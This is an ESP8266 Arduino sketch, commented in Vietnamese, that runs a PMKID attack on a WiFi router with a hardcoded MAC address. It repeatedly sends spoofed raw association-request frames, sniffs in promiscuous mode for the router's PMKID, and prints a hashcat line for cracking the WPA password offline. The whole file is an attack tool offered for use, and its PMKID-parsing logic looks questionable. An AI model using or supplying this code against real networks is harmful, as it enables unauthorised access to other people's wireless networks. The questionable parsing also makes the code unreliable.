#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

#define TARGET_BSSID      {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE7}  // MAC router của bạn (từ LAN Scan)
#define TARGET_CHANNEL    5                                      // Giữ channel 5 (bạn có thể đổi nếu biết channel khác)
#define SERIAL_BAUD       115200

uint8_t target_bssid[6] = TARGET_BSSID;

// Packet Association Request mẫu để trigger PMKID
uint8_t pmkid_packet[] = {
  0x40, 0x00,                           // Type: Association Request
  0x00, 0x00,                           // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Receiver (AP BSSID - sẽ copy)
  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,   // Transmitter (MAC giả)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID (sẽ copy)
  0x00, 0x00,                           // Sequence control
  0x31, 0x04,                           // Capability Info (short preamble + privacy)
  0x00, 0x00,                           // Listen Interval
  // RSN Information Element để yêu cầu PMKID
  0x30, 0x14,
  0x01, 0x00,
  0x00, 0x0F, 0xAC, 0x04,               // Group cipher: CCMP
  0x01, 0x00,
  0x00, 0x0F, 0xAC, 0x04,               // Pairwise: CCMP
  0x01, 0x00,
  0x00, 0x0F, 0xAC, 0x02,               // AKM: PSK
  0x00, 0x00,                           // RSN capabilities
  0x00, 0x00                            // PMKID count = 0 (router sẽ trả nếu hỗ trợ)
};

void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(300);
  
  Serial.println("\n=====================================");
  Serial.println("ESP8266 PMKID Attack - Target Router MAC");
  Serial.print("BSSID: ");
  for (int i = 0; i < 6; i++) {
    if (target_bssid[i] < 16) Serial.print("0");
    Serial.print(target_bssid[i], HEX);
    Serial.print(i < 5 ? ":" : "\n");
  }
  Serial.printf("Channel fixed: %d\n", TARGET_CHANNEL);
  Serial.println("=====================================\n");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  wifi_set_channel(TARGET_CHANNEL);
  Serial.println("Da fix channel va bat dau gui request...");
}

void loop() {
  send_pmkid_request();
  delay(400);  // Gửi mỗi ~0.4 giây (có thể tăng/giảm tùy ý)
}

void send_pmkid_request() {
  // Copy BSSID vào packet
  memcpy(&pmkid_packet[4], target_bssid, 6);   // Receiver = AP
  memcpy(&pmkid_packet[16], target_bssid, 6);  // BSSID

  // Gửi raw 802.11 frame
  int result = wifi_send_pkt_freedom(pmkid_packet, sizeof(pmkid_packet), 0);
  
  if (result == 0) {
    Serial.println("Da gui Association Request de lay PMKID...");
  } else {
    Serial.printf("Gui that bai (error: %d)\n", result);
  }

  // Bat sniff de bat phan hoi tu router
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(on_packet_received);
}

static void ICACHE_FLASH_ATTR on_packet_received(uint8_t *buf, uint16_t len) {
  if (len < 60) return;

  // Tim PMKID (thường trong tag vendor-specific 0xDD + OUI 00-90-4C-04)
  for (uint16_t i = 0; i < len - 25; i++) {
    if (buf[i] == 0xDD && 
        buf[i+1] >= 20 && 
        buf[i+4] == 0x00 && buf[i+5] == 0x90 && 
        buf[i+6] == 0x4C && buf[i+7] == 0x04) {
      
      // PMKID thường nằm ngay sau OUI (offset i+8 đến i+23, 16 bytes)
      Serial.println("\n!!! TIM THAY PMKID !!!");
      Serial.print("PMKID hex (16 bytes): ");
      
      for (int j = 0; j < 16; j++) {
        uint8_t byte_val = buf[i + 8 + j];
        if (byte_val < 16) Serial.print("0");
        Serial.print(byte_val, HEX);
        Serial.print(" ");
      }
      Serial.println("\n");
      
      Serial.println("Copy PMKID nay va tao dong hashcat:");
      Serial.println("WPA*01*PMKID_hex*20BEB41296E7*DEADBEEF0001*SSID_HEX*");
      Serial.println("(Thay PMKID_hex bang gia tri tren, SSID_HEX la ten mang chuyen hex)");
      
      // Optional: Tat sniff sau khi tim thay de tranh spam
      // wifi_promiscuous_enable(0);
      return;
    }
  }
}
